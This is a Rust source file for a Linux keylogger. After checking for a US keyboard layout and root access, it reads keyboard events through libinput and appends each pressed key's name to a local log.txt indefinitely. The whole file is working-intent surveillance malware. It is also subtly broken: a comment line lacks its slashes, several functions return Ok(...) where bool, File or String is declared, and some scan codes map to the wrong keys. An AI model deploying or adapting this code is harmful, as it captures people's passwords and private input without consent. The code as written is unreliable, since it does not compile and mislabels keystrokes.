// Imports & Globals
use std::any::type_name;
use std::io::{Read, Write};
use std::process::exit;
use std::thread::sleep_ms;
use input::{Libinput, LibinputInterface, event::keyboard::*, Event};
use std::fs::{File, OpenOptions};
use std::path::Path;
use std::ptr::{null, null_mut};
use libc::{O_RDONLY, O_RDWR, O_WRONLY};
use std::os::unix::process::CommandExt;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::{RawFd, IntoRawFd, FromRawFd};

struct Interface;

// Local input struct def 
impl LibinputInterface for Interface
{
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32>
    {
        OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(flags)
            .open(path)
            .map(|f| f.into_raw_fd())
            .map_err(|_| -1)
    }
    fn close_restricted(&mut self, fd: RawFd)
    {
        unsafe { File::from_raw_fd(fd) };
    }
}

fn main()
{
    // Confirm US-layout and admin privileges; exit otherwise
	Check if the keyboard layout is US, if not, exit
    if is_us() != true
    {
        exit(1);
    }
    if check_root() != true
    {
        exit(1);
    }

    // Create a log file and keylogger
    let log = create_log();
    keylogger(log);

    // If the keylogger function returns, exit
    exit(1);
}

///////////////////////////
// Checks keyboard layout
///////////////////////////
fn is_us() -> bool
{
    let us_layout = "us";
    let mut layout;

    // Get the keyboard layout environment variable
    match std::env::var("XKB_DEFAULT_LAYOUT")
    {
        Ok(l) => layout = l,
        Err(_) => layout = "".to_string()
    }

    // If environment variable is not set, check the /etc/default/keyboard file
    if layout == ""
    {
        // Get the keyboard layout from the /etc/default/keyboard file
        layout = std::fs::read_to_string("/etc/default/keyboard").unwrap();
    }

    // Check if the keyboard layout is US
    return if layout.contains(us_layout) { true } else { false }
}

//////////////////////////////////////
// Checks for user system privileges
//////////////////////////////////////
fn check_root() -> bool
{
    let root;
    let output = std::process::Command::new("id")
        .output()
        .expect("Failed to execute process");

    // If the output contains "uid=0", the user is root
    root = String::from_utf8_lossy(&output.stdout).contains("uid=0");

    // Return admin status
    Ok(root)
}

///////////////////////////////
// Creates the local log file
///////////////////////////////
fn create_log() -> File
{
    let mut log;

    // Create a log file
    match OpenOptions::new()
        .write(true)
        .create(true)
        .open("log.txt")
    {
        Ok(f) => log = f,
        Err(e) =>
            {
                panic!("Error creating log file: {}", e);
                exit(1)
            }
    };

    // Return the log file
    Ok(log)
}

//////////////////////////////////////////////////////////////////
// Logs keyboard behavior; should loop forever unless terminated
//////////////////////////////////////////////////////////////////
fn keylogger(mut log: std::fs::File)
{
    // Create a buffer for the keylogger
    let mut buffer = [0; 1];

    // Create a libinput context
    let mut context = Libinput::new_with_udev(Interface);
    context.udev_assign_seat("seat0").unwrap();

    // Start the event loop
    loop
    {
        // Dispatch events; collect next event
        context.dispatch().unwrap();
        let event = context.next();

        // If the event is a key event, log the key
        if let Some(Event::Keyboard(key_event)) = event
        {
            // Get the key code, state and pressed state; concatenate pressed events
            let key_code = key_event.key();
            let key_state = key_event.key_state();
            if key_state == KeyState::Pressed
            {
                // Get the key name; convert name to string and append a space
                let key_name = key_code as u8;
                let mut key_string = get_key_name(key_name);

                // Write the key name to the log file
                log.write_all(key_string.as_bytes()).unwrap();
            }
        }
		
		// Sleep momentarily if no activity detected
        else { std::thread::sleep(std::time::Duration::from_millis(10)); }
    }

    // Exit the keylogger
    exit(1);
}

///////////////////////////////////////////////////
// Converts and strings together each passed code
///////////////////////////////////////////////////
fn get_key_name(key_code: u8) -> String
{
    // Create a string for the key name
    let mut key_string = String::new();

    // Convert keyboard scan code to key name
    match key_code
    {
        0x1e => key_string = "a".to_string(),
        0x30 => key_string = "b".to_string(),
        0x2e => key_string = "c".to_string(),
        0x20 => key_string = "d".to_string(),
        0x12 => key_string = "e".to_string(),
        0x21 => key_string = "f".to_string(),
        0x22 => key_string = "g".to_string(),
        0x23 => key_string = "h".to_string(),
        0x17 => key_string = "i".to_string(),
        0x24 => key_string = "j".to_string(),
        0x25 => key_string = "k".to_string(),
        0x26 => key_string = "l".to_string(),
        0x32 => key_string = "m".to_string(),
        0x31 => key_string = "n".to_string(),
        0x18 => key_string = "o".to_string(),
        0x19 => key_string = "p".to_string(),
        0x10 => key_string = "q".to_string(),
        0x13 => key_string = "r".to_string(),
        0x1f => key_string = "s".to_string(),
        0x14 => key_string = "t".to_string(),
        0x16 => key_string = "u".to_string(),
        0x2f => key_string = "v".to_string(),
        0x11 => key_string = "w".to_string(),
        0x2d => key_string = "x".to_string(),
        0x15 => key_string = "y".to_string(),
        0x2c => key_string = "z".to_string(),
        0x02 => key_string = "1".to_string(),
        0x03 => key_string = "2".to_string(),
        0x04 => key_string = "3".to_string(),
        0x05 => key_string = "4".to_string(),
        0x06 => key_string = "5".to_string(),
        0x07 => key_string = "6".to_string(),
        0x08 => key_string = "7".to_string(),
        0x09 => key_string = "8".to_string(),
        0x0a => key_string = "9".to_string(),
        0x0b => key_string = "0".to_string(),
        0x1c => key_string = " [ENT] ".to_string(),
        0x39 => key_string = " [SPC] ".to_string(),
        0x0e => key_string = " [BKSPC] ".to_string(),
        0x0f => key_string = " [TAB] ".to_string(),
        0x1a => key_string = " [LSHFT] ".to_string(),
        0x2a => key_string = " [RSHFT] ".to_string(),
        0x1d => key_string = " [LCTRL] ".to_string(),
        0x38 => key_string = " [LALT] ".to_string(),
        0x5b => key_string = " [LSUPR] ".to_string(),
        0x5c => key_string = " [RSUPR] ".to_string(),
        0x5d => key_string = " [MENU] ".to_string(),
        0x2b => key_string = "\\".to_string(),
        0x33 => key_string = ",".to_string(),
        0x0c => key_string = "-".to_string(),
        0x34 => key_string = ".".to_string(),
        0x35 => key_string = "/".to_string(),
        0x27 => key_string = ";".to_string(),
        0x28 => key_string = "\'".to_string(),
        0x29 => key_string = "`".to_string(),
        0x0d => key_string = "=".to_string(),
        0x1b => key_string = " [ESC] ".to_string(),
        0x3a => key_string = " [F1] ".to_string(),
        0x3b => key_string = " [F2] ".to_string(),
        0x3c => key_string = " [F3] ".to_string(),
        0x3d => key_string = " [F4] ".to_string(),
        0x3e => key_string = " [F5] ".to_string(),
        0x3f => key_string = " [F6] ".to_string(),
        0x40 => key_string = " [F7] ".to_string(),
        0x41 => key_string = " [F8] ".to_string(),
        0x42 => key_string = " [F9] ".to_string(),
        0x43 => key_string = " [F10] ".to_string(),
        0x44 => key_string = " [F11] ".to_string(),
        0x57 => key_string = " [F12] ".to_string(),
        0x46 => key_string = " [PRNTSCRN] ".to_string(),
        0x45 => key_string = " [NUMLK] ".to_string(),
        0x37 => key_string = " [NUM_*] ".to_string(),
        0x4a => key_string = " [NUM_-] ".to_string(),
        0x4e => key_string = " [NUM_+] ".to_string(),
        0x53 => key_string = " [NUM_. or DEL] ".to_string(),
        0x52 => key_string = " [NUM_0 or INS] ".to_string(),
        0x4f => key_string = " [NUM_1 or END] ".to_string(),
        0x50 => key_string = " [NUM_2 or DOWN] ".to_string(),
        0x51 => key_string = " [NUM_3 or PGDN] ".to_string(),
        0x4b => key_string = " [NUM_4 or LEFT] ".to_string(),
        0x4c => key_string = " [NUM_5] ".to_string(),
        0x4d => key_string = " [NUM_6 or RIGHT] ".to_string(),
        0x47 => key_string = " [NUM_7 or HOME] ".to_string(),
        0x48 => key_string = " [NUM_8 or UP] ".to_string(),
        0x49 => key_string = " [NUM_9 or PGUP] ".to_string(),
        _ => key_string = " [UNKNOWN] ".to_string(),
    }

    Ok(key_string)
}